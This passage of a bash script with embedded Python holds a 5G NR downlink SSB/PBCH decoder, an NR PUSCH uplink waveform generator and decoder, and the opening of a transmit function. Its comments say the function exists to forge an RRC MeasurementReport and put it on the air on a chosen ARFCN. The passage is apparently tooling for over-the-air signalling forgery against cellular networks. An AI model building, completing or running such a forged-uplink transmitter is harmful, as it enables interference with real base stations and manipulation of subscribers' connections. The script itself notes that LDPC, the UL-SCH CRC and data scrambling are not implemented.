                      "(TS 38.211 5.3.1)" % (nfft, mu))
                return 2
            pat.append(c[s % 14])
        if sum(pat) + nsym * nfft != iq.size:
            print("ERROR\t%d samples is not the %d symbols of %d+CP that the CP "
                  "formula gives from subframe symbol %d (needs %d)"
                  % (iq.size, nsym, nfft, l0, sum(pat) + nsym * nfft))
            return 2
        hits = [(nfft, l0 // 14, pat)]
        print("geometry_source\texplicit (--nfft/--nsym/--l0)")
    else:
        hits = detect_slot_geometry(iq.size, mu, max(128, nfft_nom // 2),
                                    nfft_nom * 2)
        print("geometry_source\tsearched")
    print("geometry_candidates\t%d" % len(hits))
    if not hits:
        print("ERROR\tno (N_FFT, slot) pair makes %d samples into 14 CP+body "
              "symbols of the %d kHz numerology (TS 38.211 5.3.1)"
              % (iq.size, scs))
        return 2

    per_sym_start = first_energy(iq)
    period, period_rho = detect_period(iq, per_sym_start,
                                       nfft if fixed else nfft_nom * 2)

    chosen = None
    ranked = []
    for nfft, nslot, pat in hits:
        syms, starts, consumed = split_slot(iq, pat, nfft)
        bi = (ssb_bin + np.arange(240)) % nfft
        block = [np.fft.fft(s)[bi] / np.sqrt(nfft) for s in syms]
        r = -1.0
        for b in block:
            for nid2 in range(3):
                p = pss_any(nid2)
                den = np.linalg.norm(p) * np.linalg.norm(b[56:183])
                if den:
                    r = max(r, abs(np.vdot(p, b[56:183])) / den)
        ranked.append((r, nfft, nslot, pat, syms, starts, block))
    ranked.sort(key=lambda t: -t[0])
    r, nfft, nslot, pat, syms, starts, block = ranked[0]
    chosen = (nfft, nslot)
    bi = (ssb_bin + np.arange(240)) % nfft
    print("geometry_selected\t%d/%d" % (nfft, nslot))
    print("ssb_subcarrier_bin\t%d" % ssb_bin)
    print("geometry_pss_correlation\t%.4f" % r)
    if len(ranked) > 1:
        print("geometry_runner_up\t%d/%d\t%.4f" % (ranked[1][1], ranked[1][2],
                                                   ranked[1][0]))
    else:
        print("geometry_runner_up\tnone\t0.0000")
    if r < 0.5:
        print("ERROR\tno SSB found under any timing the %d kHz CP formula "
              "allows: best PSS correlation %.4f" % (scs, r))
        return 2

    # 2. Cyclic prefixes: every symbol that carries energy must repeat its own
    # body by exactly the length the spec gives it. Empty symbols cannot be
    # checked at all, so they are counted, not silently passed.
    cp_ok, cp_bad, cp_empty = 0, 0, 0
    energies = []
    for l, s in enumerate(syms):
        energies.append(float(np.mean(np.abs(s) ** 2)))
        if np.all(s == 0):
            cp_empty += 1
            continue
        pre = iq[starts[l]:starts[l] + pat[l]]
        tail = s[nfft - pat[l]:]
        den = np.sqrt(np.sum(np.abs(pre) ** 2) * np.sum(np.abs(tail) ** 2))
        ratio = abs(np.vdot(pre, tail)) / den if den else 0.0
        if ratio > 0.99:
            cp_ok += 1
        else:
            cp_bad += 1

    symbol_energy_max = max(energies) if energies else 0.0
    print("cp_pattern\t%s" % ",".join(str(x) for x in pat))
    print("cp_long_expected\t%d" % max(pat))
    print("cp_short_expected\t%d" % min(pat))
    print("cp_in_spec_set\t%d" % (1 if set(pat) <= set(
        spec_cp_pattern(nfft, mu, nslot) or []) else 0))
    print("period_detected\t%d" % period)
    print("period_correlation\t%.4f" % period_rho)
    print("nfft_detected\t%d" % nfft)
    print("nfft_nominal\t%d" % nfft_nom)
    print("symbols\t%d" % len(syms))
    print("symbols_empty\t%d" % cp_empty)
    print("symbols_energetic\t%d" % (len(syms) - cp_empty))
    print("cp_symbols_ok\t%d" % cp_ok)
    print("cp_symbols_bad\t%d" % cp_bad)
    print("symbol_energy_max\t%.4g" % symbol_energy_max)
    print("slot_samples\t%d" % iq.size)
    if not fixed:
        print("subframe_samples\t%d" % (iq.size * (2 ** mu)))
    print("slot_us\t%.1f" % (1000.0 * iq.size / (nfft * scs * 1000)))

    # 3. Sequences. Blind search over every symbol, against this file's own
    # recursions, with the pinned chips as the guard rail.
    best_sym, best_nid2, best_r = None, None, -1.0
    for l, b in enumerate(block):
        for nid2 in range(3):
            p = pss_any(nid2)
            den = np.linalg.norm(p) * np.linalg.norm(b[56:183])
            rr = abs(np.vdot(p, b[56:183])) / den if den else 0.0
            if rr > best_r:
                best_sym, best_nid2, best_r = l, nid2, rr

    sss_sym, nid1, sss_r = None, None, -1.0
    if best_nid2 is not None:
        for l, b in enumerate(block):
            if l == best_sym:
                continue
            for n1 in range(336):
                s = sss_any(n1, best_nid2)
                den = np.linalg.norm(s) * np.linalg.norm(b[56:183])
                rr = abs(np.vdot(s, b[56:183])) / den if den else 0.0
                if rr > sss_r:
                    sss_sym, nid1, sss_r = l, n1, rr

    p_ok = all(list(pss_any(i))[:32] == PSS_PINNED[i] for i in range(3))
    s_ok = all(list(sss_any(k // 3, k % 3))[:32] == v
               for k, v in SSS_PINNED.items())
    print("pss_pinned_agree\t%d" % (1 if p_ok else 0))
    print("sss_pinned_agree\t%d" % (1 if s_ok else 0))
    print("pss_pinned_table\t%d" % len(PSS_PINNED))
    print("sss_pinned_table\t%d" % len(SSS_PINNED))
    print("pss_symbol\t%s" % (best_sym if best_sym is not None else "none"))
    print("pss_correlation\t%.4f" % best_r)
    print("n_id_2\t%s" % (best_nid2 if best_nid2 is not None else "none"))
    print("sss_symbol\t%s" % (sss_sym if sss_sym is not None else "none"))
    print("sss_offset_from_pss\t%s" % (sss_sym - best_sym
                                       if None not in (sss_sym, best_sym)
                                       else "none"))
    print("n_id_1\t%s" % (nid1 if nid1 is not None else "none"))
    print("sss_correlation\t%.4f" % sss_r)
    pci = 3 * nid1 + best_nid2 if None not in (nid1, best_nid2) else None
    print("pci_recovered\t%s" % (pci if pci is not None else "none"))

    # 4. The SSB's own subcarrier map, re-derived from the spec for the
    # recovered PCI: energy must sit on the PSS/SSS/PBCH/DMRS REs and nowhere
    # else in the block.
    out_max = 0.0
    blk_rms = float(np.sqrt(np.mean([np.mean(np.abs(b) ** 2) for b in block]))) or 1.0
    rest = np.setdiff1d(np.arange(nfft), bi)
    for s in syms:
        out = np.fft.fft(s)[rest] / np.sqrt(nfft)
        if out.size:
            out_max = max(out_max, float(np.max(np.abs(out))) / blk_rms)
    print("out_of_block_max\t%.4f" % out_max)

    if pci is not None and best_sym is not None:
        v = pci % 4
        # The generator writes int16, so the recovered grid carries an
        # unknown constant gain. Every presence test is therefore relative to
        # the strongest RE in the SSB: the quantisation floor sits four orders
        # of magnitude below any driven subcarrier.
        blk_ref = max(float(np.max(np.abs(b))) for b in block) or 1.0
        present = 1e-4 * blk_ref
        s0 = best_sym
        if s0 + 3 >= len(block):
            print("ERROR\tPSS at symbol %d leaves no room for the 4 SSB "
                  "symbols" % s0)
            return 2
        ssb = block[s0:s0 + 4]
        # The legal REs of each SSB symbol: PSS or SSS in k = 56..182, the
        # DMRS comb, and the PBCH data REs. Energy anywhere else in the block
        # is a placement error, which is what re_outside_spec counts.
        allowed = {
            0: set(range(56, 183)),
            1: set(spec_dmrs_re(v, 1)) | set(spec_pbch_re(v, 1)),
            2: (set(range(56, 183)) | set(spec_dmrs_re(v, 2))
                | set(spec_pbch_re(v, 2))),
            3: set(spec_dmrs_re(v, 3)) | set(spec_pbch_re(v, 3)),
        }
        outside = 0
        dmrs_hits = 0
        dmrs_total = 0
        for s in (1, 2, 3):
            for k in spec_dmrs_re(v, s):
                dmrs_total += 1
                if abs(ssb[s][k]) > present:
                    dmrs_hits += 1
        for s in range(4):
            for k in range(240):
                if k in allowed[s]:
                    continue
                if abs(ssb[s][k]) > present:
                    outside += 1
        dmrs_qpsk = all(
            abs(abs(ssb[s][k].real) - abs(ssb[s][k].imag))
            <= 0.05 * (abs(ssb[s][k].real) + abs(ssb[s][k].imag))
            for s in (1, 2, 3) for k in spec_dmrs_re(v, s))
        print("ssb_first_symbol\t%d" % s0)
        print("re_outside_spec\t%d" % outside)
        print("dmrs_re_checked\t%d" % dmrs_total)
        print("dmrs_re_present\t%d" % dmrs_hits)
        print("dmrs_constellation_ok\t%d" % (1 if dmrs_qpsk else 0))
        print("pss_re_present\t%d" % sum(1 for k in range(56, 183)
                                          if abs(ssb[0][k]) > present))
        print("sss_re_present\t%d" % sum(1 for k in range(56, 183)
                                          if abs(ssb[2][k]) > present))
        print("sss_neighbours_empty\t%d" % (1 if all(
            abs(ssb[2][k]) <= present
            for k in list(range(48, 56)) + list(range(183, 192))) else 0))
        # The pinned DMRS chips are c_init's output at i_SSB = 0. A file that
        # carries another SSB index was built from a different sequence, so
        # --i-ssb (when the caller knows it) turns this into "not checked"
        # instead of a disagreement the pin cannot actually judge.
        pin = DMRS_PINNED.get(pci)
        if pin and pin_ssb == 0:
            got = "".join(("0" if ssb[1][k].real > 0 else "1") +
                          ("0" if ssb[1][k].imag > 0 else "1")
                          for k in spec_dmrs_re(v, 1)[:len(pin) // 2])
            print("dmrs_pinned_checked\t%d" % (len(pin) // 2))
            print("dmrs_pinned_agree\t%d" % (1 if got == pin else 0))
        else:
            print("dmrs_pinned_checked\t0")
            print("dmrs_pinned_agree\tn/a")

        # 5. The PBCH block: the 864 coded bits of the BCH chain demodulated
        # from the 432 PBCH REs, then inverted through TS 38.211 7.3.3.1 and
        # TS 38.212 7.1. The MIB and the SFN come OUT OF THE CODEWORD: the
        # coded bits are rate matched, polar coded, scrambled and interleaved,
        # so a decoder that read "the MIB" from any fixed RE would be reading
        # its own generator's layout instead of the specification's.
        coded = []
        for s in (1, 2, 3):
            for k in spec_pbch_re(v, s):
                c = ssb[s][k]
                coded += [0 if c.real > 0 else 1, 0 if c.imag > 0 else 1]
        # L_max selects nu's width in TS 38.211 7.3.3.1 and the 7.1.1 payload
        # branch: 4 or 8 in FR1, 64 for the FR2 SSB cases D/E. --l-max names it
        # when the waveform came from a band whose case says so (Case A is 4).
        print("pbch_bits_used\t%d" % len(coded))
        print("l_max_assumed\t%d" % l_max_dec)
        res = bch_decode(coded, pci, l_max_dec)
        print("bch_decode_ok\t%d" % res["decode_ok"])
        print("bch_nu_attempts\t%d" % res["attempts"])
        if res["decode_ok"]:
            print("bch_i_ssb\t%d" % res["nu"])
            # The whole index, not just the scrambling part: for L_max 64 the
            # upper three bits ride in the PBCH payload (7.1.1), so a receiver
            # that only reports nu would call i_SSB 63 "7".
            print("bch_i_ssb_full\t%d" % res["i_ssb"])
            print("bch_descramble_v\t%d" % res["v"])
            print("mib_hex\t%s" % "".join(
                "%x" % int("".join(str(x) for x in res["mib"][i:i + 4]), 2)
                for i in range(0, 24, 4)))
            print("mib_sfn\t%d" % res["sfn"])
            print("mib_sfn_field\t%d" % (res["sfn"] >> 4))
            print("mib_message_type\t%d" % res["mib"][0])
            print("pbch_crc24c_ok\t1")
            print("bch_payload_hex\t%s" % "".join(
                "%x" % int("".join(str(x) for x in res["payload"][i:i + 4]), 2)
                for i in range(0, 32, 4)))
        else:
            print("pbch_crc24c_ok\t0")
    if grid_out:
        with open(grid_out, "w") as fh:
            for l, b in enumerate(block):
                fh.write("%d\t%s\n" % (l, " ".join(
                    "%.6f:%.6f" % (x.real, x.imag) for x in b)))
    print("scs_khz\t%d" % scs)
    print("decoder_version\t%s" % DEC_VERSION)
    return 0


if __name__ == "__main__":
    sys.exit(main())
NAIR_PYEOF
}

# ── uplink baseband — the forged report on the air ──────────────────────
# O17's deliverable is a forged MeasurementReport, and a report is an UPLINK
# message: a receiver-only module could build the PDU but could never put it
# on the air. This is that half. What it builds is a real CP-OFDM PUSCH slot
# per TS 38.211 §6.4.1 — the demodulation reference signal of §6.4.1.1.1 on
# the subcarriers that section names, the UL-SCH bits QPSK-mapped over the
# rest, and the §5.3.1 cyclic prefixes the downlink path uses too.
#
# What is NOT implemented is printed rather than implied: the LDPC chain and
# rate matching of §7.2, the UL-SCH CRC, and the data scrambling of §6.3.1.1.
# A QPSK mapping of the PDU bits is honest about being a QPSK mapping of the
# PDU bits, and the three checks that ARE real — the DMRS sequence, the CP
# geometry, and the PDU read back out of the waveform — are the ones that
# would catch a forgery that never left the keyboard.
nair_write_ul_gen() {
    mkdir -p "$MOD_TMP" 2>/dev/null
    cat > "$NAIR_UL_PY" <<'NAIR_PYEOF'
#!/usr/bin/env python3
"""NR PUSCH (uplink) baseband generator — TS 38.211 6.4.1, 5.3.1, 7.4.1.1.1.

One slot of CP-OFDM carrying a PUSCH: the demodulation reference signal of
6.4.1.1.1 on DMRS configuration type 1 (every second subcarrier), and the
UL-SCH transport block QPSK-mapped onto the remaining resource elements.

Deliberately absent, and named in the output rather than implied away: the
LDPC chain and rate matching of 38.212 7.2, the UL-SCH CRC, and the bit
scrambling of 38.211 6.3.1.1.

CLI: nr_ul_gen.py <out.c16> <ulsch_hex> <scid> <scs_khz> <nfft>
                   <n_rb_carrier> <rb_start> <n_rb_alloc>
                   [--i8 FILE] [--detail FILE]
"""
import sys

import numpy as np

# TS 38.211 6.4.1.1.1 with n_scid = 0 and N_ID^SCID = scrambling id. The same
# c_init form as the PDSCH DMRS, which is what makes the sequence checkable
# against an independent implementation of the Gold generator (38.211 5.2.1).
# Each entry is the first 8 QPSK chips as interleaved sign bits (I then Q,
# MSB first), taken from that independent implementation, not from this file.
DMRS_PINNED = {
    0:  "0110010001111000",
    42: "0001001010000000",
}


def gold(c_init, length):
    """TS 38.211 5.2.1, Nc = 1600."""
    nc = 1600
    x1 = [0] * (nc + length + 31)
    x2 = [0] * (nc + length + 31)
    x1[0] = 1
    for i in range(31):
        x2[i] = (c_init >> i) & 1
    for n in range(nc + length):
        x1[n + 31] = (x1[n + 3] + x1[n]) % 2
        x2[n + 31] = (x2[n + 3] + x2[n + 2] + x2[n + 1] + x2[n]) % 2
    return np.array([(x1[n + nc] + x2[n + nc]) % 2 for n in range(length)],
                    dtype=np.int64)


def qpsk(bits):
    """TS 38.211 5.1.3."""
    return np.array([complex(1 - 2 * bits[2 * i], 1 - 2 * bits[2 * i + 1]) / np.sqrt(2)
                     for i in range(len(bits) // 2)])


def cp_lengths(mu, nslot, nfft):
    """TS 38.211 5.3.1 at f_s = N_FFT * dF: N_CP = 144*N_FFT/2048, plus
    16*N_FFT*2^-mu/2048 for l = 0 and l = 7*2^mu of the subframe. Same rule
    the downlink generator uses."""
    num_s = 144 * nfft
    num_x = 16 * nfft * (2 ** mu)
    if num_s % 2048 or num_x % 2048:
        raise SystemExit("ERROR\tN_FFT %d is not a multiple of the numerology "
                         "grid 2048*2^-%d" % (nfft, mu))
    short, extra = num_s // 2048, num_x // 2048
    long_ = short + extra
    l0 = nslot * 14
    return [long_ if (l0 + l) in (0, 7 * (2 ** mu)) else short for l in range(14)]


def main():
    args = sys.argv[1:]
    if len(args) < 8:
        raise SystemExit("ERROR\tusage: nr_ul_gen.py <out.c16> <ulsch_hex> "
                         "<scid> <scs_khz> <nfft> <n_rb_carrier> <rb_start> "
                         "<n_rb_alloc> [--i8 FILE] [--detail FILE]")
    out, hexs = args[0], args[1]
    scid, scs, nfft, n_rb, rb_start, n_alloc = (int(x) for x in args[2:8])
    i8f = det = None
    i = 8
    while i < len(args):
        if args[i] == "--i8" and i + 1 < len(args):
            i8f = args[i + 1]
            i += 2
        elif args[i] == "--detail" and i + 1 < len(args):
            det = args[i + 1]
            i += 2
        else:
            raise SystemExit("ERROR\tunknown argument %s" % args[i])

    if scs not in (15, 30, 60, 120, 240):
        raise SystemExit("ERROR\t%d kHz is not an NR subcarrier spacing" % scs)
    if not 0 <= scid <= 1023:
        raise SystemExit("ERROR\tscrambling id %d is outside 0..1023" % scid)
    if n_rb <= 0 or n_alloc <= 0 or rb_start < 0 or rb_start + n_alloc > n_rb:
        raise SystemExit("ERROR\tallocation RB %d..%d does not fit a %d RB "
                         "carrier" % (rb_start, rb_start + n_alloc - 1, n_rb))
    mu = scs // 15 - 1
    if nfft % 128:
        raise SystemExit("ERROR\tN_FFT %d is not a multiple of 128" % nfft)

    if hexs.lower().startswith("0x"):
        hexs = hexs[2:]
    if not hexs or len(hexs) % 2 or any(c not in "0123456789abcdefABCDEF" for c in hexs):
        raise SystemExit("ERROR\t%s is not an even-length hex transport block" % hexs)
    tb = []
    for k in range(0, len(hexs), 2):
        byte = int(hexs[k:k + 2], 16)
        tb += [(byte >> b) & 1 for b in range(7, -1, -1)]

    # TS 38.104 Table 5.3.2-1 sizes the carrier; the allocation is expressed
    # relative to the carrier centre, which sits between subcarriers
    # 6*n_rb-1 and 6*n_rb of the carrier's own grid.
    first = 12 * rb_start - 6 * n_rb
    alloc = [first + c for c in range(12 * n_alloc)]
    l_dmrs = 2                     # mapping type A, dmrs-TypeA-Position pos2
    dmrs_sc = [k for k in alloc if (k - first) % 2 == 0]   # config type 1

    c_init = (2 ** 17 * (14 * 0 + l_dmrs + 1) * (2 * scid + 1) + 2 * scid) % (2 ** 31)
    dmrs = qpsk(gold(c_init, 2 * len(dmrs_sc)))
    pin = DMRS_PINNED.get(scid)
    got = "".join(("1" if s.real < 0 else "0") + ("1" if s.imag < 0 else "0")
                  for s in dmrs[:8])
    if pin is not None and got != pin:
        raise SystemExit("ERROR\tPUSCH DMRS for scrambling id %d does not "
                         "reproduce the pinned TS 38.211 chips (c_init = %d)"
                         % (scid, c_init))

    data = qpsk(tb)
    grid = []
    driven = 0
    for l in range(14):
        v = np.zeros(nfft, dtype=complex)
        if l == l_dmrs:
            for j, k in enumerate(dmrs_sc):
                v[(k + nfft // 2) % nfft] = dmrs[j]
        else:
            for k in alloc:
                if driven < len(data):
                    v[(k + nfft // 2) % nfft] = data[driven]
                    driven += 1
        grid.append(v)

    cps = cp_lengths(mu, 0, nfft)
    parts = []
    for l in range(14):
        body = np.fft.ifft(grid[l]) * np.sqrt(nfft)
        if cps[l]:
            parts.append(body[-cps[l]:])
        parts.append(body)
    sig = np.concatenate(parts)

    peak = float(np.max(np.abs(sig))) or 1.0
    inter = np.empty(2 * len(sig), dtype=np.int16)
    inter[0::2] = np.rint(sig.real / peak * 32000.0)
    inter[1::2] = np.rint(sig.imag / peak * 32000.0)
    inter.astype("<i2").tofile(out)

    fs = nfft * scs * 1000
    print("fs_hz\t%d" % fs)
    print("scs_khz\t%d" % scs)
    print("mu\t%d" % mu)
    print("nfft\t%d" % nfft)
    print("slot_samples\t%d" % len(sig))
    print("slot_us\t%.3f" % (len(sig) * 1e6 / fs))
    print("subframe_samples\t%d" % (fs // 1000))
    print("cp_long\t%d" % max(cps))
    print("cp_short\t%d" % min(cps))
    print("alloc_rb_start\t%d" % rb_start)
    print("alloc_rb\t%d" % n_alloc)
    print("alloc_sc\t%d" % len(alloc))
    print("dmrs_symbol\t%d" % l_dmrs)
    print("dmrs_sc\t%d" % len(dmrs_sc))
    print("dmrs_c_init\t%d" % c_init)
    print("dmrs_re\t%d" % len(dmrs_sc))
    print("dmrs_pinned_checked\t%s" % ("1" if pin is not None else "0"))
    print("dmrs_pinned_agree\t%s" % ("n/a" if pin is None else "1"))
    print("ulsch_hex\t%s" % hexs.lower())
    print("ulsch_bits\t%d" % len(tb))
    print("ulsch_re\t%d" % len(data))
    print("ulsch_re_driven\t%d" % driven)
    print("transform_precoding\toff (CP-OFDM, TS 38.211 6.4.1.1.1)")
    print("pusch_encoding\tulsch = rrc pdu bits qpsk; ldpc/rate-matching "
          "(38.212 7.2), ul-sch crc and data scrambling (38.211 6.3.1.1) "
          "NOT implemented; %d of %d data res driven"
          % (driven, (14 - 1) * 12 * n_alloc))
    print("iq_bytes\t%d" % (4 * len(sig)))
    if det:
        with open(det, "w") as fh:
            for l, v in enumerate(grid):
                for n in np.nonzero(v)[0]:
                    fh.write("%d\t%d\t%.6f\t%.6f\n"
                             % (l, int(n) - nfft // 2, v[n].real, v[n].imag))
    if i8f:
        i8 = np.clip(np.rint(inter.astype(np.float64) / 256.0), -128, 127).astype(np.int8)
        i8.tofile(i8f)
        print("iq8_file\t%s" % i8f)
        print("iq8_bytes\t%d" % len(i8))
    return 0


if __name__ == "__main__":
    sys.exit(main())
NAIR_PYEOF
}

# The decoder for that waveform. It reads the .c16 back, derives the slot
# geometry from the sample count and the spec's CP rule, recomputes the DMRS
# from the scrambling id and correlates it, and recovers the transport block
# from the data resource elements in mapping order — the caller's expected
# hex is only used for the comparison at the end, never for the recovery.
nair_write_ul_dec() {
    mkdir -p "$MOD_TMP" 2>/dev/null
    cat > "$NAIR_UL_DEC_PY" <<'NAIR_PYEOF'
#!/usr/bin/env python3
"""Independent PUSCH slot decoder — TS 38.211 6.4.1, 5.3.1, 7.4.1.1.1.

Nothing here reads the generator's code. The slot geometry comes from the
sample count and the spec's CP rule, the DMRS is recomputed from the spec and
correlated against what is in the file, and the UL-SCH bits are recovered by
QPSK-demodulating the data resource elements in mapping order — the caller
only says what it expects afterwards, for the comparison.

CLI: nr_ul_dec.py <in.c16> <scs_khz> <nfft_nominal> <n_rb_carrier> <rb_start>
                  <n_rb_alloc> <scid> [--expect HEX]
"""
import sys

import numpy as np

DMRS_PINNED = {
    0:  "0110010001111000",
    42: "0001001010000000",
}


def load_c16(path):
    raw = np.fromfile(path, dtype="<i2")
    if raw.size == 0 or raw.size % 2:
        raise SystemExit("ERROR\t%s holds no complete I/Q samples" % path)
    return (raw[0::2].astype(np.float64) + 1j * raw[1::2].astype(np.float64)) / 32768.0


def first_energy(iq, thresh=1e-3):
    """Leading empty symbols are legal (the downlink generator emits them) and
    must not be mistaken for a cyclic prefix, so the slot starts at the first
    sample with real signal in it."""
    e = np.abs(iq)
    idx = np.nonzero(e > thresh)[0]
    return int(idx[0]) if idx.size else -1


def spec_cp_pattern(nfft, mu, nslot):
    num_s = 144 * nfft
    num_x = 16 * nfft * (2 ** mu)
    if num_s % 2048 or num_x % 2048:
        return None
    short, extra = num_s // 2048, num_x // 2048
    long_ = short + extra
    l0 = nslot * 14
    return [long_ if (l0 + l) in (0, 7 * (2 ** mu)) else short for l in range(14)]


def detect_geometry(nsamples, mu, nfft_nom):
    """The (N_FFT, slot) readings whose spec CP pattern sums with 14 bodies to
    exactly the sample count. A wrong reading cannot pass this: the total is
    14*N_FFT + sum(N_CP), so it is fixed by the numerology, not fitted."""
    out = []
    cands = [nfft_nom // 2, nfft_nom, nfft_nom * 2]
    for nfft in cands:
        if nfft < 128 or nfft % 128:
            continue
        for slot in range(2 ** mu):
            pat = spec_cp_pattern(nfft, mu, slot)
            if pat is None:
                continue
            if 14 * nfft + sum(pat) == nsamples:
                out.append((nfft, slot, pat))
    return out


def gold(c_init, length):
    nc = 1600
    x1 = [0] * (nc + length + 31)
    x2 = [0] * (nc + length + 31)
    x1[0] = 1
    for i in range(31):
        x2[i] = (c_init >> i) & 1
    for n in range(nc + length):
        x1[n + 31] = (x1[n + 3] + x1[n]) % 2
        x2[n + 31] = (x2[n + 3] + x2[n + 2] + x2[n + 1] + x2[n]) % 2
    return np.array([(x1[n + nc] + x2[n + nc]) % 2 for n in range(length)],
                    dtype=np.int64)


def qpsk(bits):
    return np.array([complex(1 - 2 * bits[2 * i], 1 - 2 * bits[2 * i + 1]) / np.sqrt(2)
                     for i in range(len(bits) // 2)])


def bits_to_hex(bits):
    n = (len(bits) // 8) * 8
    return "".join("%02x" % sum(bits[i + b] << (7 - b) for b in range(8))
                   for i in range(0, n, 8))


def main():
    args = sys.argv[1:]
    expect = None
    if "--expect" in args:
        j = args.index("--expect")
        if j + 1 >= len(args):
            raise SystemExit("ERROR\t--expect needs a hex PDU")
        expect = args[j + 1].lower().removeprefix("0x")
        args = args[:j] + args[j + 2:]
    if len(args) != 7:
        raise SystemExit("ERROR\tusage: nr_ul_dec.py <in.c16> <scs_khz> "
                         "<nfft_nominal> <n_rb_carrier> <rb_start> "
                         "<n_rb_alloc> <scid> [--expect HEX]")
    path = args[0]
    scs, nfft_nom, n_rb, rb_start, n_alloc, scid = (int(x) for x in args[1:7])
    mu = scs // 15 - 1

    iq = load_c16(path)
    start = first_energy(iq)
    if start < 0:
        print("ERROR\tthe file holds no signal above the noise floor", file=sys.stderr)
        return 2
    n = iq.size - start
    geo = detect_geometry(n, mu, nfft_nom)
    print("geometry_candidates\t%d" % len(geo))
    if not geo:
        print("ERROR\tno (N_FFT, slot) pair makes %d samples into 14 CP+body "
              "symbols of the %d kHz numerology (TS 38.211 5.3.1)" % (n, scs),
              file=sys.stderr)
        return 2
    nfft, slot, cps = geo[0]
    iq = iq[start:start + 14 * nfft + sum(cps)]
    print("geometry_selected\t%d/%d" % (nfft, slot))
    print("cp_pattern\t%s" % ",".join(str(c) for c in cps))
    print("cp_long_expected\t%d" % max(cps))
    print("cp_short_expected\t%d" % min(cps))
    print("nfft_detected\t%d" % nfft)
    print("nfft_nominal\t%d" % nfft_nom)
    print("slot_samples\t%d" % iq.size)
    print("slot_us\t%.3f" % (iq.size * 1e6 / (nfft * scs * 1000)))

    pos = 0
    syms = []
    cp_ok = cp_bad = 0
    for l in range(14):
        cp = int(cps[l])
        body = iq[pos + cp:pos + cp + nfft]
        if cp:
            pre = iq[pos:pos + cp]
            den = float(np.vdot(body[-cp:], body[-cp:]).real)
            if den <= 1e-12:
                cp_ok += 1        # an empty CP proves nothing; not a failure
            else:
                r = float(np.vdot(pre, body[-cp:]).real / np.sqrt(den * np.vdot(pre, pre).real + 1e-18))
                if r > 0.9:
                    cp_ok += 1
                else:
                    cp_bad += 1
        syms.append(np.fft.fft(body) / np.sqrt(nfft))
        pos += cp + nfft
    print("symbols\t14")
    print("cp_symbols_ok\t%d" % cp_ok)
    print("cp_symbols_bad\t%d" % cp_bad)

    first = 12 * rb_start - 6 * n_rb
    alloc = [first + c for c in range(12 * n_alloc)]
    aidx = [(k + nfft // 2) % nfft for k in alloc]
    l_dmrs = 2
    dmrs_sc = [k for k in alloc if (k - first) % 2 == 0]
    didx = [(k + nfft // 2) % nfft for k in dmrs_sc]

    c_init = (2 ** 17 * (14 * 0 + l_dmrs + 1) * (2 * scid + 1) + 2 * scid) % (2 ** 31)
    dmrs_ref = qpsk(gold(c_init, 2 * len(dmrs_sc)))
    rx = syms[l_dmrs][didx]
    # The generator writes int16 with an unknown constant gain, so the
    # comparison is scale-free: normalise before correlating.
    g = float(np.vdot(rx, rx).real)
    r = float(np.vdot(dmrs_ref, rx).real) / np.sqrt(len(dmrs_ref) * g + 1e-18)
    print("dmrs_c_init\t%d" % c_init)
    print("dmrs_re_checked\t%d" % len(dmrs_sc))
    print("dmrs_correlation\t%.4f" % r)
    pin = DMRS_PINNED.get(scid)
    got = "".join(("1" if s.real < 0 else "0") + ("1" if s.imag < 0 else "0")
                  for s in dmrs_ref[:8])
    if pin is not None:
        print("dmrs_pinned_checked\t1")
        print("dmrs_pinned_agree\t%s" % ("1" if got == pin else "0"))
    else:
        print("dmrs_pinned_checked\t0")
        print("dmrs_pinned_agree\tn/a")

    # Everything outside the allocation must be empty, and inside it only the
    # DMRS comb or data may carry energy.
    ref = float(np.max(np.abs(syms[0][aidx]))) + 1e-18
    outside = 0
    for l in range(14):
        v = np.abs(syms[l])
        for k in range(nfft):
            kk = k - nfft // 2
            if kk in alloc:
                continue
            if v[k] > 1e-3 * ref:
                outside += 1
    print("re_outside_alloc\t%d" % outside)

    # Data resource elements are every allocated subcarrier of every non-DMRS
    # symbol, taken in mapping order. The transport block occupies the first
    # driven ones; the rest are empty and are reported as such rather than
    # being filled with a guess.
    bits = []
    driven = 0
    for l in range(14):
        if l == l_dmrs:
            continue
        for k in alloc:
            s = syms[l][(k + nfft // 2) % nfft]
            if abs(s) <= 1e-3 * ref:
                continue
            driven += 1
            bits += [1 if s.real < 0 else 0, 1 if s.imag < 0 else 0]
    print("ulsch_re_driven\t%d" % driven)
    print("ulsch_bits_recovered\t%d" % len(bits))
    hexr = bits_to_hex(bits)
    print("pdu_hex_recovered\t%s" % (hexr or "-"))
    if expect is None:
        return 0
    print("expect_hex\t%s" % expect)
    ok = hexr.startswith(expect) and len(hexr) >= len(expect)
    print("pdu_match\t%s" % ("1" if ok else "0"))
    if cp_bad or outside or r < 0.9:
        print("ERROR\tthe waveform is not a PUSCH of this cell: "
              "cp_symbols_bad %d, re_outside_alloc %d, dmrs_correlation %.4f"
              % (cp_bad, outside, r), file=sys.stderr)
        return 3
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
NAIR_PYEOF
}

# ── O17 transmit path — forge the measurement report and put it on the air ─
# Called by --build-meas-report <spec> --tx. The PDU is built by the module's
# own APER encoder (the part that is pinned to published vectors), then a
# PUSCH slot is built around it, decoded back, and only then keyed. Without a
# radio there is no success line.
#
# spec keys measId/servCell/servRsrp/ssb are encoded into the PDU; arfcn and
# scid are used only by this transmit path (the PDU has no room for a
# frequency, and the UL carrier is the same carrier in TDD).
nair_cmd_meas_report_tx() {
    local spec="${1:-}"
    [[ -n "$spec" ]] || {
        printf 'ERROR	usage: --build-meas-report <measId=N[,servCell=N][,servRsrp=N][,ssb=i:r,...]> [--tx]\n' >&2
        return 2; }

    local band="n78" arfcn="640000" scid="${NAIR_UL_SCID:-0}" tok
    while IFS= read -r tok; do
        [[ -n "$tok" ]] || continue
        local k v
        k=$(printf '%s' "$tok" | cut -d= -f1)
        v=$(printf '%s' "$tok" | cut -d= -f2-)
        case "$k" in
            arfcn) arfcn="$v" ;;
            band)  band="$v" ;;
            scid)  scid="$v" ;;
        esac
    done < <(printf '%s\n' "$spec" | tr ',' '\n')
    [[ "$arfcn" =~ ^[0-9]+$ ]] || {
        printf 'ERROR\t--build-meas-report --tx: arfcn must be numeric\n' >&2; return 2; }
    [[ "$band" =~ ^n[0-9]+$ ]] || {
        printf 'ERROR\t--build-meas-report --tx: band must look like n78\n' >&2; return 2; }
    [[ "$scid" =~ ^[0-9]+$ ]] && (( scid <= 1023 )) || {
        printf 'ERROR\t--build-meas-report --tx: scid must be 0..1023\n' >&2; return 2; }

    # arfcn/band/scid steer the waveform; they are not report fields, so they
    # are stripped before the APER encoder sees the spec (it would refuse them
